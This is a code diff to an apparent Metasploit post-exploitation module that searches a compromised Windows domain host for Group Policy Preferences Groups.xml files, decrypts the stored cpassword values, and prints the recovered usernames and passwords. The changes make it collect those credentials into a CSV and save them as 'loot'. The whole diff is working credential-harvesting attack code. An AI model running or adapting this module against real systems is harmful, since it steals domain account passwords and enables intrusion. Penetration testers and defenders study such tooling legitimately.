@@ -20,7 +20,8 @@ class Metasploit3 < Msf::Post
 		super(update_info(info,
 			'Name'            => "Windows Gather Enum Group Policy Prefences Passwords",
 			'Description'     => %q{
-				"This module enumerates users and passwords created on the local machine via group policy preferences.
+				"This module enumerates users and passwords created on the local machine
+				via group policy preferences.
 				Based upon work by:				 
 				http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences			
 				Code heavily based on enum_domain.rb and smartftp.rb modules.
@@ -59,11 +60,10 @@ class Metasploit3 < Msf::Post
 		return domain_controller
 	end
 	
-	# Modified from smartftp.rb
 	# Recursive function that enums specific subdirs through a list of regexs to a specific path.
 	def enum_subdirs(path, regex)
-#		The search function takes too long as not indexed.
-#		enum_groups_xml = session.fs.file.search(path, "Groups.xml", true, -1)
+		# The search function takes too long as not indexed.
+		# enum_groups_xml = session.fs.file.search(path, "Groups.xml", true, -1)
 
 		enum_groups_xml = []
 		current_regex = regex.pop
@@ -80,13 +80,13 @@ class Metasploit3 < Msf::Post
 				end
 			end
 		rescue Rex::Post::Meterpreter::RequestError => e
-			#print_error "Received error code #{e.code} when enumerating #{path}"
+			# Permission errors
+			# print_error "Received error code #{e.code} when enumerating #{path}"
 		end
 
 		return enum_groups_xml
 	end
 	
-	# Taken from smartftp.rb
 	def get_xml(path)
 		begin
 			connections = client.fs.file.new(path, 'r')
@@ -102,9 +102,9 @@ class Metasploit3 < Msf::Post
 		end
 	end
 	
-	# Taken from smartftp.rb
 	def parse_xml(data)
 		mxml = REXML::Document.new(data)
+		return_value = ""
 		mxml.elements.each("Groups/User/Properties") do |property|
 		
 			next if property.attributes["cpassword"].nil?
@@ -121,22 +121,12 @@ class Metasploit3 < Msf::Post
 				username = new_name
 			end
 			
-			print_good("username: #{username}, disabled: #{disabled}, password: #{password}, action: #{action}")
-			
-#			if session.db_record
-#				source_id = session.db_record.id
-#			else
-#				source_id = nil
-#			end
-#			report_auth_info(
-#						:host  => host,
-#						:port => port,
-#						:source_id => ssource_id,
-#						:source_type => "exploit",
-#						:user => user,
-#						:pass => pass
-#					)
+			output = "username: #{username}, disabled: #{disabled}, password: #{password}, action: #{action}"
+			return_value << "#{username},#{disabled},#{password},#{action},\n"
+			print_good(output)
 		end
+		
+		return return_value
 	end
 	
 	def decrypt(password)
@@ -164,13 +154,24 @@ class Metasploit3 < Msf::Post
 			print_status("Searching #{target_path} for Groups.xml")
 			
 			regex = [ /^(Groups.xml)$/, /^(Groups)/, /^(Preferences)/, /^(Machine)/, /^(\{[\d\w-]*\})/ ]
-			
+			csv = "username,disabled,password,action,\n"
+
 			for result in enum_subdirs(target_path, regex)
 				xml = get_xml(result)
 				unless xml.nil?
-					parse_xml(xml)
+					csv << parse_xml(xml)
 				end
 			end
+			
+			print_status("Writing to loot...")
+                        path = store_loot(
+                                'gpp.passwords',
+                                'text/plain',
+                                session,
+                                csv,
+                                )
+                        print_status("Data saved in: #{path}")
+
 		else
 			print_error("This host is not part of a domain.")
 		end
